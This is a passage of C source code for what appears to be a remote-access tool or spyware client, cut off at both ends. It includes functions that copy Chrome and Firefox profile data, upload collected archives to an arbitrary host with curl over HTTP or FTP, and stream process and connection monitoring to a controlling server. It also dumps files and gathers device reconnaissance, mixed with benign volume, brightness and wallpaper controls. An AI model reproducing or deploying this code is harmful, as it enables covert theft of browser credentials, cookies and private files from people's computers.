            printf("Terminated %d processes\n", terminated);
        } else {
            printf("No processes found matching '%s'\n", args[0]);
        }
    }
}

// Browser data extraction
void extract_browser_data(char **args) {
    printf("\n[Browser Data Extraction]\n");
    
    char browser_output_dir[MAX_PATH_LENGTH];
    snprintf(browser_output_dir, sizeof(browser_output_dir), "%s/browser_data", output_dir);
    
    #ifdef _WIN32
        printf("Extracting browser data (Windows)\n");
        
        // Chrome
        char chrome_path[MAX_PATH_LENGTH];
        snprintf(chrome_path, sizeof(chrome_path), "%s\\AppData\\Local\\Google\\Chrome\\User Data",
                 getenv("USERPROFILE"));
        
        if (CreateDirectory(browser_output_dir, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "xcopy \"%s\\Default\\*\" %s\\chrome /E /I /H", 
                     chrome_path, browser_output_dir);
            system(cmd);
            printf("Chrome data extracted to %s/chrome\n", browser_output_dir);
        }
        
        // Firefox
        char firefox_path[MAX_PATH_LENGTH];
        snprintf(firefox_path, sizeof(firefox_path), "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
                 getenv("USERPROFILE"));
        
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(firefox_path, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "xcopy \"%s\\%s\\*\" %s\\firefox /E /I /H", 
                     firefox_path, findData.cFileName, browser_output_dir);
            system(cmd);
            printf("Firefox data extracted to %s/firefox\n", browser_output_dir);
            FindClose(hFind);
        }
    #else
        printf("\nExtracting browser data (Linux)\n");
        
        // Chrome
        if (mkdir(browser_output_dir, 0755) == 0 || errno == EEXIST) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "cp -r ~/.config/google-chrome/Default %s/chrome", browser_output_dir);
            system(cmd);
            printf("Chrome data extracted to %s/chrome\n", browser_output_dir);
        }
        
        // Firefox
        char firefox_path[MAX_PATH_LENGTH];
        snprintf(firefox_path, sizeof(firefox_path), "~/.mozilla/firefox/*.default");
        
        DIR *dir = opendir(firefox_path);
        if (dir) {
            char cmd[MAX_COMMAND_LENGTH];
            snprintf(cmd, sizeof(cmd), "cp -r %s %s/firefox", firefox_path, browser_output_dir);
            system(cmd);
            printf("Firefox data extracted to %s/firefox\n", browser_output_dir);
            closedir(dir);
        }
    #endif
    
    printf("Browser data extracted to %s\n", browser_output_dir);
}

// Data exfiltration
void exfiltrate_data(char **args) {
    printf("\n[Data Exfiltration]\n");
    
    if (args[0] == NULL || args[1] == NULL) {
        printf("Usage: exfil <http|ftp> <target> [data]\n");
        return;
    }
    
    const char *data = args[2] ? args[2] : "collected_data.zip";
    
    if (strcmp(args[0], "http") == 0) {
        printf("Exfiltrating data via HTTP to %s\n", args[1]);
        char cmd[MAX_COMMAND_LENGTH * 2];
        snprintf(cmd, sizeof(cmd), "curl -F \"file=@%s\" %s", data, args[1]);
        system(cmd);
    } else if (strcmp(args[0], "ftp") == 0) {
        printf("Exfiltrating data via FTP to %s\n", args[1]);
        char cmd[MAX_COMMAND_LENGTH * 2];
        snprintf(cmd, sizeof(cmd), "curl -T %s ftp://%s", data, args[1]);
        system(cmd);
    } else {
        printf("Unknown exfiltration method: %s\n", args[0]);
    }
}

// Get network connections
void get_network_connections(NetworkConn *connections, int *count) {
    *count = 0;
    
    #ifdef _WIN32
        PMIB_TCPTABLE_OWNER_PID pTcpTable;
        DWORD dwSize = 0;
        DWORD dwRetVal = 0;
        
        GetExtendedTcpTable(NULL, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
        pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc(dwSize);
        
        if ((dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0)) != NO_ERROR) {
            free(pTcpTable);
            return;
        }
        
        for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
            if (*count >= MAX_NETWORK_CONNS) break;
            
            connections[*count].pid = pTcpTable->table[i].dwOwningPid;
            
            // Local address
            struct in_addr localAddr;
            localAddr.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
            strcpy(connections[*count].local_addr, inet_ntoa(localAddr));
            connections[*count].local_port = ntohs((u_short)pTcpTable->table[i].dwLocalPort);
            
            // Remote address
            struct in_addr remoteAddr;
            remoteAddr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;
            strcpy(connections[*count].remote_addr, inet_ntoa(remoteAddr));
            connections[*count].remote_port = ntohs((u_short)pTcpTable->table[i].dwRemotePort);
            
            // State
            switch (pTcpTable->table[i].dwState) {
                case MIB_TCP_STATE_CLOSED: strcpy(connections[*count].state, "CLOSED"); break;
                case MIB_TCP_STATE_LISTEN: strcpy(connections[*count].state, "LISTEN"); break;
                case MIB_TCP_STATE_SYN_SENT: strcpy(connections[*count].state, "SYN_SENT"); break;
                case MIB_TCP_STATE_SYN_RCVD: strcpy(connections[*count].state, "SYN_RCVD"); break;
                case MIB_TCP_STATE_ESTAB: strcpy(connections[*count].state, "ESTABLISHED"); break;
                case MIB_TCP_STATE_FIN_WAIT1: strcpy(connections[*count].state, "FIN_WAIT1"); break;
                case MIB_TCP_STATE_FIN_WAIT2: strcpy(connections[*count].state, "FIN_WAIT2"); break;
                case MIB_TCP_STATE_CLOSE_WAIT: strcpy(connections[*count].state, "CLOSE_WAIT"); break;
                case MIB_TCP_STATE_CLOSING: strcpy(connections[*count].state, "CLOSING"); break;
                case MIB_TCP_STATE_LAST_ACK: strcpy(connections[*count].state, "LAST_ACK"); break;
                case MIB_TCP_STATE_TIME_WAIT: strcpy(connections[*count].state, "TIME_WAIT"); break;
                case MIB_TCP_STATE_DELETE_TCB: strcpy(connections[*count].state, "DELETE_TCB"); break;
                default: strcpy(connections[*count].state, "UNKNOWN"); break;
            }
            
            (*count)++;
        }
        
        free(pTcpTable);
    #else
        FILE *fp = fopen("/proc/net/tcp", "r");
        if (fp == NULL) return;
        
        char line[256];
        fgets(line, sizeof(line), fp); // Skip header
        
        while (fgets(line, sizeof(line), fp)) {
            if (*count >= MAX_NETWORK_CONNS) break;
            
            unsigned long local_addr, remote_addr;
            int local_port, remote_port, state, uid;
            
            sscanf(line, "%*d: %lx:%x %lx:%x %x %*x:%*x %*x:%*x %*x %d",
                   &local_addr, &local_port, &remote_addr, &remote_port, &state, &uid);
            
            // Convert IP addresses
            struct in_addr addr;
            addr.s_addr = htonl(local_addr);
            strcpy(connections[*count].local_addr, inet_ntoa(addr));
            connections[*count].local_port = local_port;
            
            addr.s_addr = htonl(remote_addr);
            strcpy(connections[*count].remote_addr, inet_ntoa(addr));
            connections[*count].remote_port = remote_port;
            
            // Get process info (simplified)
            connections[*count].pid = -1;
            
            // State
            switch (state) {
                case 1: strcpy(connections[*count].state, "ESTABLISHED"); break;
                case 2: strcpy(connections[*count].state, "SYN_SENT"); break;
                case 3: strcpy(connections[*count].state, "SYN_RECV"); break;
                case 4: strcpy(connections[*count].state, "FIN_WAIT1"); break;
                case 5: strcpy(connections[*count].state, "FIN_WAIT2"); break;
                case 6: strcpy(connections[*count].state, "TIME_WAIT"); break;
                case 7: strcpy(connections[*count].state, "CLOSE"); break;
                case 8: strcpy(connections[*count].state, "CLOSE_WAIT"); break;
                case 9: strcpy(connections[*count].state, "LAST_ACK"); break;
                case 10: strcpy(connections[*count].state, "LISTEN"); break;
                case 11: strcpy(connections[*count].state, "CLOSING"); break;
                default: strcpy(connections[*count].state, "UNKNOWN"); break;
            }
            
            (*count)++;
        }
        
        fclose(fp);
    #endif
}

// Real-time monitoring thread
void* realtime_monitor(void *arg) {
    ProcessInfo prev_processes[MAX_PROCESSES];
    NetworkConn prev_connections[MAX_NETWORK_CONNS];
    int prev_process_count = 0, prev_conn_count = 0;
    
    get_processes(prev_processes, &prev_process_count);
    get_network_connections(prev_connections, &prev_conn_count);
    
    while (realtime_monitoring) {
        ProcessInfo curr_processes[MAX_PROCESSES];
        NetworkConn curr_connections[MAX_NETWORK_CONNS];
        int curr_process_count = 0, curr_conn_count = 0;
        
        get_processes(curr_processes, &curr_process_count);
        get_network_connections(curr_connections, &curr_conn_count);
        
        // Check for new processes
        for (int i = 0; i < curr_process_count; i++) {
            int found = 0;
            for (int j = 0; j < prev_process_count; j++) {
                if (curr_processes[i].pid == prev_processes[j].pid) {
                    found = 1;
                    break;
                }
            }
            
            if (!found) {
                printf("[MONITOR] New process: %s (PID: %d)\n", 
                       curr_processes[i].name, curr_processes[i].pid);
                if (connected_to_server) {
                    char msg[512];
                    snprintf(msg, sizeof(msg), "MONITOR:New process: %s (PID: %d)", 
                             curr_processes[i].name, curr_processes[i].pid);
                    send_to_server(msg);
                }
            }
        }
        
        // Check for new connections
        for (int i = 0; i < curr_conn_count; i++) {
            int found = 0;
            for (int j = 0; j < prev_conn_count; j++) {
                if (strcmp(curr_connections[i].local_addr, prev_connections[j].local_addr) == 0 &&
                    curr_connections[i].local_port == prev_connections[j].local_port &&
                    strcmp(curr_connections[i].remote_addr, prev_connections[j].remote_addr) == 0 &&
                    curr_connections[i].remote_port == prev_connections[j].remote_port) {
                    found = 1;
                    break;
                }
            }
            
            if (!found && strcmp(curr_connections[i].state, "ESTABLISHED") == 0) {
                printf("[MONITOR] New connection: %s:%d -> %s:%d (PID: %d)\n",
                       curr_connections[i].local_addr, curr_connections[i].local_port,
                       curr_connections[i].remote_addr, curr_connections[i].remote_port,
                       curr_connections[i].pid);
                if (connected_to_server) {
                    char msg[512];
                    snprintf(msg, sizeof(msg), "MONITOR:New connection: %s:%d -> %s:%d (PID: %d)",
                             curr_connections[i].local_addr, curr_connections[i].local_port,
                             curr_connections[i].remote_addr, curr_connections[i].remote_port,
                             curr_connections[i].pid);
                    send_to_server(msg);
                }
            }
        }
        
        // Update previous state
        memcpy(prev_processes, curr_processes, sizeof(ProcessInfo) * curr_process_count);
        prev_process_count = curr_process_count;
        memcpy(prev_connections, curr_connections, sizeof(NetworkConn) * curr_conn_count);
        prev_conn_count = curr_conn_count;
        
        #ifdef _WIN32
            Sleep(1000);
        #else
            sleep(1);
        #endif
    }
    
    return NULL;
}

// Start real-time monitoring
void start_realtime_monitoring(char **args) {
    if (realtime_monitoring) {
        printf("Real-time monitoring is already running\n");
        return;
    }
    
    printf("\n[Real-Time Monitoring]\n");
    printf("Starting real-time activity monitoring...\n");
    
    realtime_monitoring = 1;
    pthread_create(&monitor_thread, NULL, realtime_monitor, NULL);
    
    printf("Monitoring started. Type 'show' to see current data.\n");
}

// Show monitoring data
void show_monitoring_data(char **args) {
    printf("\n[Monitoring Data]\n");
    
    ProcessInfo processes[MAX_PROCESSES];
    int process_count;
    get_processes(processes, &process_count);
    
    NetworkConn connections[MAX_NETWORK_CONNS];
    int conn_count;
    get_network_connections(connections, &conn_count);
    
    printf("\nRunning Processes (%d):\n", process_count);
    for (int i = 0; i < process_count; i++) {
        printf("PID: %-6d | Name: %-20s | User: %s\n", 
               processes[i].pid, processes[i].name, processes[i].user);
    }
    
    printf("\nNetwork Connections (%d):\n", conn_count);
    for (int i = 0; i < conn_count; i++) {
        printf("%-15s:%-5d -> %-15s:%-5d %s (PID: %d)\n",
               connections[i].local_addr, connections[i].local_port,
               connections[i].remote_addr, connections[i].remote_port,
               connections[i].state, connections[i].pid);
    }
}

// Get IP address
void get_ip_address(char *ip) {
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            strcpy(ip, "127.0.0.1");
            return;
        }
        
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            strcpy(ip, "127.0.0.1");
            WSACleanup();
            return;
        }
        
        struct hostent *host = gethostbyname(hostname);
        if (host == NULL) {
            strcpy(ip, "127.0.0.1");
            WSACleanup();
            return;
        }
        
        strcpy(ip, inet_ntoa(*(struct in_addr *)host->h_addr_list[0]));
        WSACleanup();
    #else
        struct ifaddrs *ifaddr, *ifa;
        int family;
        
        if (getifaddrs(&ifaddr) == -1) {
            strcpy(ip, "127.0.0.1");
            return;
        }
        
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr == NULL) continue;
            
            family = ifa->ifa_addr->sa_family;
            
            if (family == AF_INET && strcmp(ifa->ifa_name, "lo") != 0) {
                struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
                strcpy(ip, inet_ntoa(addr->sin_addr));
                break;
            }
        }
        
        freeifaddrs(ifaddr);
        
        if (ip[0] == '\0') {
            strcpy(ip, "127.0.0.1");
        }
    #endif
}

// Device info
void device_info(char **args) {
    printf("\n[Device Information]\n");
    char output[4096];
    
    // System info
    printf("\nSystem Information:\n");
    #ifdef _WIN32
        execute_command("systeminfo", output, sizeof(output));
    #else
        execute_command("uname -a", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // CPU info
    printf("\nCPU Information:\n");
    #ifdef _WIN32
        execute_command("wmic cpu get name,numberofcores,numberoflogicalprocessors", output, sizeof(output));
    #else
        execute_command("lscpu", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // Memory info
    printf("\nMemory Information:\n");
    #ifdef _WIN32
        execute_command("wmic memorychip get capacity,speed,partnumber", output, sizeof(output));
    #else
        execute_command("free -h", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // Disk info
    printf("\nDisk Information:\n");
    #ifdef _WIN32
        execute_command("wmic diskdrive get model,size,interfacetype", output, sizeof(output));
    #else
        execute_command("lsblk", output, sizeof(output));
    #endif
    printf("%s\n", output);
    
    // Network info
    printf("\nNetwork Information:\n");
    char ip[64];
    get_ip_address(ip);
    printf("IP Address: %s\n", ip);
    #ifdef _WIN32
        execute_command("ipconfig /all", output, sizeof(output));
    #else
        execute_command("ifconfig -a", output, sizeof(output));
    #endif
    printf("%s\n", output);
}

// Wallpaper changer
void wallpaper_changer(char **args) {
    if (args[0] == NULL) {
        printf("Usage: wallpaper <image_path>\n");
        return;
    }
    
    printf("\n[Wallpaper Changer]\n");
    
    #ifdef _WIN32
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)args[0], SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        printf("Wallpaper changed to %s\n", args[0]);
    #else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "gsettings set org.gnome.desktop.background picture-uri file://%s", args[0]);
        system(cmd);
        printf("Wallpaper changed to %s\n", args[0]);
    #endif
}

// Enhanced file dump
void enhanced_file_dump(char **args) {
    printf("\n[Enhanced File Dump]\n");
    
    char path[MAX_PATH_LENGTH];
    if (args[0] == NULL) {
        strcpy(path, current_dir);
    } else {
        strcpy(path, args[0]);
    }
    
    char output_file[MAX_PATH_LENGTH];
    if (args[1] == NULL) {
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        snprintf(output_file, sizeof(output_file), "%s/dumps/dump_%04d%02d%02d_%02d%02d%02d.txt",
                 output_dir,
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec);
    } else {
        snprintf(output_file, sizeof(output_file), "%s/dumps/%s", output_dir, args[1]);
    }
    
    FILE *fp = fopen(output_file, "w");
    if (fp == NULL) {
        printf("Failed to create output file %s\n", output_file);
        return;
    }
    
    fprintf(fp, "=== Directory Structure ===\n");
    DIR *dir;
    struct dirent *entry;
    
    if ((dir = opendir(path)) == NULL) {
        fprintf(fp, "Could not open directory %s\n", path);
        fclose(fp);
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        char full_path[MAX_PATH_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        struct stat st;
        if (stat(full_path, &st) == -1) {
            continue;
        }
        
        if (S_ISDIR(st.st_mode)) {
            fprintf(fp, "[DIR]  %s\n", entry->d_name);
        } else {
            fprintf(fp, "[FILE] %s (%ld bytes)\n", entry->d_name, st.st_size);
        }
    }
    
    closedir(dir);
    
    fprintf(fp, "\n=== File Contents (Text Files) ===\n");
    dir = opendir(path);
    
    while ((entry = readdir(dir)) != NULL) {
        char full_path[MAX_PATH_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        struct stat st;
        if (stat(full_path, &st) == -1) {
            continue;
        }
        
        if (S_ISREG(st.st_mode) && 
            (strstr(entry->d_name, ".txt") || strstr(entry->d_name, ".log") || 
             strstr(entry->d_name, ".conf") || strstr(entry->d_name, ".ini"))) {
            FILE *file = fopen(full_path, "r");
            if (file) {
                fprintf(fp, "\nFile: %s\n", full_path);
                
                char line[1024];
                while (fgets(line, sizeof(line), file)) {
                    fprintf(fp, "%s", line);
                }
                
                fprintf(fp, "\n==================================================\n");
                fclose(file);
            }
        }
    }
    
    closedir(dir);
    
    fprintf(fp, "\n=== System Information ===\n");
    
    ProcessInfo processes[MAX_PROCESSES];
    int count;
    get_processes(processes, &count);
    
    fprintf(fp, "\nRunning Processes:\n");
    for (int i = 0; i < count; i++) {
        fprintf(fp, "PID: %-6d | Name: %-20s | User: %s\n", 
               processes[i].pid, processes[i].name, processes[i].user);
    }
    
    NetworkConn connections[MAX_NETWORK_CONNS];
    int conn_count;
    get_network_connections(connections, &conn_count);
    
    fprintf(fp, "\nNetwork Connections:\n");
    for (int i = 0; i < conn_count; i++) {
        fprintf(fp, "%-15s:%-5d -> %-15s:%-5d %s (PID: %d)\n",
               connections[i].local_addr, connections[i].local_port,
               connections[i].remote_addr, connections[i].remote_port,
               connections[i].state, connections[i].pid);
    }
    
    fclose(fp);
    printf("Dump saved to %s\n", output_file);
}

// Clear screen
void clear_screen(char **args) {
    #ifdef _WIN32
        system("cls");
    #else
        system("clear");
    #endif
}

// Volume Control
void volume_control(char **args) {
    printf("\n[Volume Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: volume <level (0-100)>\n");
        return;
    }
    
    int volume = atoi(args[0]);
    if (volume < 0) volume = 0;
    if (volume > 100) volume = 100;
    
#ifdef _WIN32
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        printf("Failed to initialize COM\n");
        return;
    }
    
    BOOL success = FALSE;
    
    // Define the necessary GUIDs and interfaces manually
    static const GUID CLSID_MMDeviceEnumerator = {
        0xbcde0395, 0xe52f, 0x467c, {0x8e, 0x3d, 0xc6, 0x42, 0x94, 0x72, 0x16, 0x22}
    };
    
    static const GUID IID_IMMDeviceEnumerator = {
        0xa95664d2, 0x9614, 0x4f35, {0xa7, 0x46, 0xde, 0x8d, 0xb6, 0x36, 0x17, 0xe6}
    };
    
    static const GUID IID_IAudioEndpointVolume = {
        0x5cdf2c82, 0x841e, 0x4546, {0x97, 0x22, 0x0c, 0xf7, 0x40, 0x78, 0x22, 0x9a}
    };
    
    // Define the IAudioEndpointVolume interface manually
    typedef struct IAudioEndpointVolumeVtbl {
        HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
        ULONG (STDMETHODCALLTYPE *AddRef)(void *);
        ULONG (STDMETHODCALLTYPE *Release)(void *);
        HRESULT (STDMETHODCALLTYPE *GetMasterVolumeLevel)(void *, float *);
        HRESULT (STDMETHODCALLTYPE *SetMasterVolumeLevel)(void *, float, LPCGUID);
        HRESULT (STDMETHODCALLTYPE *GetMasterVolumeLevelScalar)(void *, float *);
        HRESULT (STDMETHODCALLTYPE *SetMasterVolumeLevelScalar)(void *, float, LPCGUID);
        HRESULT (STDMETHODCALLTYPE *GetVolumeRange)(void *, float *, float *, float *);
    } IAudioEndpointVolumeVtbl;
    
    typedef struct IAudioEndpointVolume {
        IAudioEndpointVolumeVtbl *lpVtbl;
    } IAudioEndpointVolume;
    
    // Define the IMMDeviceEnumerator interface manually
    typedef struct IMMDeviceEnumeratorVtbl {
        HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
        ULONG (STDMETHODCALLTYPE *AddRef)(void *);
        ULONG (STDMETHODCALLTYPE *Release)(void *);
        HRESULT (STDMETHODCALLTYPE *EnumAudioEndpoints)(void *, EDataFlow, DWORD, void **);
        HRESULT (STDMETHODCALLTYPE *GetDefaultAudioEndpoint)(void *, EDataFlow, ERole, void **);
        HRESULT (STDMETHODCALLTYPE *GetDevice)(void *, LPCWSTR, void **);
    } IMMDeviceEnumeratorVtbl;
    
    typedef struct IMMDeviceEnumerator {
        IMMDeviceEnumeratorVtbl *lpVtbl;
    } IMMDeviceEnumerator;
    
    // Define the IMMDevice interface manually
    typedef struct IMMDeviceVtbl {
        HRESULT (STDMETHODCALLTYPE *QueryInterface)(void *, REFIID, void **);
        ULONG (STDMETHODCALLTYPE *AddRef)(void *);
        ULONG (STDMETHODCALLTYPE *Release)(void *);
        HRESULT (STDMETHODCALLTYPE *Activate)(void *, REFIID, DWORD, PROPVARIANT *, void **);
        HRESULT (STDMETHODCALLTYPE *OpenPropertyStore)(void *, DWORD, void **);
        HRESULT (STDMETHODCALLTYPE *GetId)(void *, LPWSTR *);
        HRESULT (STDMETHODCALLTYPE *GetState)(void *, DWORD *);
    } IMMDeviceVtbl;
    
    typedef struct IMMDevice {
        IMMDeviceVtbl *lpVtbl;
    } IMMDevice;
    
    // Method 1: Try Core Audio API (this controls the system master volume)
    IMMDeviceEnumerator *pEnumerator = NULL;
    IMMDevice *pDevice = NULL;
    IAudioEndpointVolume *pEndpointVolume = NULL;
    
    hr = CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, 
                         &IID_IMMDeviceEnumerator, (void**)&pEnumerator);
    if (SUCCEEDED(hr)) {
        hr = pEnumerator->lpVtbl->GetDefaultAudioEndpoint(pEnumerator, eRender, eConsole, (void**)&pDevice);
        if (SUCCEEDED(hr)) {
            hr = pDevice->lpVtbl->Activate(pDevice, &IID_IAudioEndpointVolume, CLSCTX_ALL, NULL, (void**)&pEndpointVolume);
            if (SUCCEEDED(hr)) {
                // First, get the current volume to verify it works
                float currentVolume = 0.0f;
                hr = pEndpointVolume->lpVtbl->GetMasterVolumeLevelScalar(pEndpointVolume, &currentVolume);
                if (SUCCEEDED(hr)) {
                    printf("Current volume: %.0f%%\n", currentVolume * 100);
                    
                    // Now set the new volume
                    float level = (float)volume / 100.0f;
                    hr = pEndpointVolume->lpVtbl->SetMasterVolumeLevelScalar(pEndpointVolume, level, NULL);
                    if (SUCCEEDED(hr)) {
                        // Verify the volume was set correctly
                        float newVolume = 0.0f;
                        hr = pEndpointVolume->lpVtbl->GetMasterVolumeLevelScalar(pEndpointVolume, &newVolume);
                        if (SUCCEEDED(hr)) {
                            printf("Volume set to %.0f%% (Core Audio API)\n", newVolume * 100);
                            success = TRUE;
                            
                            // Test if volume actually changed by playing a test sound
                            printf("Testing volume with a system beep...\n");
                            MessageBeep(MB_ICONASTERISK);
                        }
                    }
                }
            }
            pEndpointVolume->lpVtbl->Release(pEndpointVolume);
        }
        pDevice->lpVtbl->Release(pDevice);
    }
    pEnumerator->lpVtbl->Release(pEnumerator);
    
    // Method 2: Try PowerShell as fallback (simulates volume keys)
    if (!success) {
        char cmd[MAX_COMMAND_LENGTH];
        // Calculate how many volume up/down presses are needed (each press is 2%)
        int steps = volume / 2;
        snprintf(cmd, sizeof(cmd), "powershell -Command \"$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]173); Start-Sleep -Milliseconds 500; for ($i = 0; $i -lt %d; $i++) { $obj.SendKeys([char]175); Start-Sleep -Milliseconds 50 }\"", steps);
        int result = system(cmd);
        
        if (result == 0) {
            printf("Volume set to %d%% (PowerShell)\n", volume);
            success = TRUE;
            
            // Test if volume actually changed
            printf("Testing volume with a system beep...\n");
            MessageBeep(MB_ICONASTERISK);
        }
    }
    
    // Method 3: Try Windows Mixer API (controls wave volume, not system volume)
    if (!success) {
        HMIXER hMixer = NULL;
        MIXERLINE mxl = {0};
        MIXERLINECONTROLS mxlc = {0};
        MIXERCONTROL mxc = {0};
        MIXERCONTROLDETAILS mxcd = {0};
        MIXERCONTROLDETAILS_UNSIGNED mxcd_u = {0};
        
        if (mixerOpen(&hMixer, 0, 0, 0, MIXER_OBJECTF_MIXER) == MMSYSERR_NOERROR) {
            mxl.cbStruct = sizeof(MIXERLINE);
            mxl.dwComponentType = MIXERLINE_COMPONENTTYPE_DST_SPEAKERS;
            
            if (mixerGetLineInfo((HMIXEROBJ)hMixer, &mxl, MIXER_GETLINEINFOF_COMPONENTTYPE) == MMSYSERR_NOERROR) {
                mxlc.cbStruct = sizeof(MIXERLINECONTROLS);
                mxlc.dwLineID = mxl.dwLineID;
                mxlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
                mxlc.cControls = 1;
                mxlc.cbmxctrl = sizeof(MIXERCONTROL);
                mxlc.pamxctrl = &mxc;
                
                if (mixerGetLineControls((HMIXEROBJ)hMixer, &mxlc, MIXER_GETLINECONTROLSF_ONEBYTYPE) == MMSYSERR_NOERROR) {
                    mxcd.cbStruct = sizeof(MIXERCONTROLDETAILS);
                    mxcd.dwControlID = mxc.dwControlID;
                    mxcd.cChannels = 1;
                    mxcd.cMultipleItems = 0;
                    mxcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
                    mxcd.paDetails = &mxcd_u;
                    
                    // Calculate volume value (0-65535)
                    mxcd_u.dwValue = (DWORD)(volume * 655.35);
                    
                    if (mixerSetControlDetails((HMIXEROBJ)hMixer, &mxcd, MIXER_SETCONTROLDETAILSF_VALUE) == MMSYSERR_NOERROR) {
                        printf("Volume set to %d%% (Mixer API - wave volume only)\n", volume);
                        success = TRUE;
                        
                        // Test if volume actually changed
                        printf("Testing volume with a system beep...\n");
                        MessageBeep(MB_ICONASTERISK);
                    }
                }
            }
            mixerClose(hMixer);
        }
    }
    
    if (!success) {
        printf("Failed to set volume. All methods failed.\n");
    } else {
        printf("Volume change applied. If you don't hear a difference, try playing audio.\n");
    }
    
    CoUninitialize();
#else
    // Linux implementation
    char cmd[MAX_COMMAND_LENGTH];
    
    // Try with amixer (ALSA)
    snprintf(cmd, sizeof(cmd), "amixer sset Master %d%%", volume);
    int result = system(cmd);
    
    if (result != 0) {
        // Try with pactl (PulseAudio)
        snprintf(cmd, sizeof(cmd), "pactl set-sink-volume @DEFAULT_SINK@ %d%%", volume);
        result = system(cmd);
        
        if (result != 0) {
            printf("Failed to set volume. Neither amixer nor pactl available.\n");
            return;
        }
    }
    
    printf("Volume set to %d%%\n", volume);
    
    // Test if volume actually changed
    printf("Testing volume with a system beep...\n");
    system("paplay /usr/share/sounds/alsa/Front_Center.wav 2>/dev/null || echo -e '\a' 2>/dev/null");
#endif
}

// Brightness Control
void brightness_control(char **args) {
    printf("\n[Brightness Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: brightness <level (0-100)>\n");
        return;
    }
    
    int brightness = atoi(args[0]);
    if (brightness < 0) brightness = 0;
    if (brightness > 100) brightness = 100;
    
#ifdef _WIN32
    BOOL success = FALSE;
    
    // Method 1: Try PowerShell
    char cmd[MAX_COMMAND_LENGTH];
    snprintf(cmd, sizeof(cmd), "powershell -Command \"(Get-WmiObject -Namespace root/wmi -Class WmiMonitorBrightnessMethods).WmiSetBrightness(%d)\"", brightness);
    int result = system(cmd);
    
    if (result == 0) {
        printf("Brightness set to %d%% (PowerShell)\n", brightness);
        success = TRUE;
    }
    
    // Method 2: Try powercfg
    if (!success) {
        snprintf(cmd, sizeof(cmd), "powercfg -setdcvalueindex SCHEME_CURRENT SUB_VIDEO VID_BRIGHTNESS %d", brightness);
        result = system(cmd);
        
        if (result == 0) {
            printf("Brightness set to %d%% (powercfg)\n", brightness);
            success = TRUE;
        }
    }
    
    // Method 3: Try another PowerShell approach
    if (!success) {
        snprintf(cmd, sizeof(cmd), "powershell -Command \"$brightness = %d; $monitors = Get-WmiObject -Namespace root\\wmi -Class WmiMonitorBrightness; foreach ($monitor in $monitors) { $monitor.WmiSetBrightness($brightness, 1) }\"", brightness);
        result = system(cmd);
        
        if (result == 0) {
            printf("Brightness set to %d%% (PowerShell alternative)\n", brightness);
            success = TRUE;
        }
    }
    
    if (!success) {
        printf("Failed to set brightness. All methods failed.\n");
    }
#else
    // Linux implementation
    char cmd[MAX_COMMAND_LENGTH];
    char backlight_path[MAX_PATH_LENGTH] = {0};
    
    // Try to find the backlight device
    DIR *dir = opendir("/sys/class/backlight");
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                snprintf(backlight_path, sizeof(backlight_path), "/sys/class/backlight/%s", entry->d_name);
                break;
            }
        }
        closedir(dir);
    }
    
    if (backlight_path[0] == '\0') {
        printf("No backlight device found\n");
        return;
    }
    
    // Get max brightness
    char max_brightness_path[MAX_PATH_LENGTH];
    snprintf(max_brightness_path, sizeof(max_brightness_path), "%s/max_brightness", backlight_path);
    
    FILE *fp = fopen(max_brightness_path, "r");
    if (!fp) {
        printf("Failed to read max brightness\n");
        return;
    }
    
    int max_brightness = 0;
    if (fscanf(fp, "%d", &max_brightness) != 1) {
        printf("Failed to parse max brightness\n");
        fclose(fp);
        return;
    }
    fclose(fp);
    
    // Calculate new brightness value
    int new_brightness = (int)(max_brightness * brightness / 100.0f);
    
    // Set brightness
    char brightness_path[MAX_PATH_LENGTH];
    snprintf(brightness_path, sizeof(brightness_path), "%s/brightness", backlight_path);
    
    fp = fopen(brightness_path, "w");
    if (!fp) {
        printf("Failed to set brightness (permission denied?)\n");
        return;
    }
    
    fprintf(fp, "%d", new_brightness);
    fclose(fp);
    
